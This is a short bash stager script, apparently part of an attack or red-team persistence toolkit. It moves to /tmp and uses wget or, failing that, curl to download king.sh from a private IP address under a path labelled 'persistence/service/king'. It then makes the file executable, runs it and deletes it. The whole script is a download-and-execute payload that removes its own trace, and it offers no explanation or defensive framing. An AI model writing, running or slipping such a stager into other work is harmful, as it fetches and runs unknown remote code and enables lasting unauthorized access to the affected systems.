#!/bin/bash

FALSE=$(/bin/false)
HAS_WGET=$(which wget)
HAS_CURL=$(which curl)

cd /tmp

if [[ "$HAS_WGET" != "$FALSE" ]];
then
    wget "http://10.2.45.121:11000/preload/scripts/persistence/service/king/king.sh" -O king.sh
    chmod +x king.sh
    ./king.sh
    rm king.sh
    exit
fi

if [[ "$HAS_CURL" != "$FALSE" ]];
then
    curl "http://10.2.45.121:11000/preload/scripts/persistence/service/king/king.sh" -o king.sh
    chmod +x king.sh
    ./king.sh
    rm king.sh
    exit
fi
